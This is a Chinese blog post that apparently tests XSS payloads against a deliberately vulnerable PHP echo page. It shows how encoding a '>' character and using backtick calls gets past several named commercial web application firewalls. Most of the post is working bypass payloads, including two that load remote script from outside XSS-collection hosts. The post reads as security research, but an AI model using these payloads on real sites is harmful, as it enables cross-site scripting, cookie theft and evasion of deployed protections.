### 前言
- - -
360主机卫士是360旗下的服务器安全软件，为站长免费提供网站后门检测、木马查杀，网站补丁、漏洞防护等服务...

![1](https://ae01.alicdn.com/kf/Uad2732ca0c4943088ca09f550ff5caccL.png)

(虽然软件几年前就停止更新，官网挂了，但是从当时的评论上看软件还是很不错的。)

### 环境
- - -
火狐

360主机卫士Apache版

phpStudy2016(PHP-5.4.45+Apache)

测试代码
```
<?php   
  $input = @$_REQUEST["xss"];
  echo "<div>".$input."</div>"
?>
```
### 测试
- - -
习惯性的直接上 Burp 用平时收集的 payload fuzz 一遍，结果不怎么理想，能过的很鸡肋...然后我就去网上找资料，找到了一篇文章[xss加入某些字符即可过大多数waf的思路及一些思考](https://mp.weixin.qq.com/s/CCc12FWWJMRP4V6x0XXaoA)根据里面的思路可以绕过。

`<svg onload>` 拦截

`<svg > onload>`不拦截

具体绕过就是先把 `>` html实体编码

![2](https://ae01.alicdn.com/kf/Ue6dc8da4a8ac4497a96828e039c729574.png)

将 `&#62` URL编码

![3](https://ae01.alicdn.com/kf/U143681d1e9b64df0b67ebab674991c93N.png)

大部分 `xss payload` 加上 `%26%2362` 即可绕过，但是类似 alert(1) 括号可能会被拦截 可以用反引号替换
```
<svg %26%2362 onload=alert`1`>
```
![4](https://ae01.alicdn.com/kf/U3529497cee1f48e7b86ccedd924109a2B.png)

给几个测试绕过的 `payload`
```
<style  %26%2362 onload=alert`1`>
<img %26%2362 src=1  onerror=alert`1`>
<audio %26%2362 src=x  onerror=alert`1`>
<svg %26%2362 onload=appendChild(createElement('script')).src='//xs.ax/HfcB'>
```

该文章在最后说明此方法可以绕过多款waf，接下来我们来测试。

`云锁`：

![5.png](https://ae01.alicdn.com/kf/Ua781c4541fce4d9287ddc4218025ee49L.png)

绕过
```
<svg %26%2362 onload=alert`1`>
```

`奇安信CDN`：

拦截
```
<svg %26%2362 onload=alert`1`>
```
![7.png](https://ae01.alicdn.com/kf/Ua119486efcd94f83881e7135b9aa13daX.png)

绕过方法(使用HTML5新标签)

`<select autofocus onfocus=[2].find(alert)>`

`安全狗`：

绕过
![8.png](https://ae01.alicdn.com/kf/U75a996f4667944d2895372a9eb417a07U.png)

`阿里云`：

拦截
![9.png](https://ae01.alicdn.com/kf/U59c6226bba53437a9ee15b9d3e5f70e1w.png)

绕过方法(这个百度下就有)
```
<img src=# onerror=alert`2`>
<input onfocus="document.body.appendChild(createElement('script')).src='//xss.xx/B6Bb'" autofocus>
```

![10.png](https://ae01.alicdn.com/kf/U3d07d821e85a4a028b8eb360e7c78a04X.png)

`百度云加速`：

绕过
![11.png](https://ae01.alicdn.com/kf/Ufe4b45196d59424c930e54b49efa091aK.png)

### 小结
此次利用 `>` 字符的编码绕过的姿势，再到其他 waf 测试到此结束，至于其他特殊字符是否也有绕过，感兴趣的可以研究下，如有错误之处，请师傅指正。

### 参考
[xss加入某些字符即可过大多数waf的思路及一些思考](https://mp.weixin.qq.com/s/CCc12FWWJMRP4V6x0XXaoA)
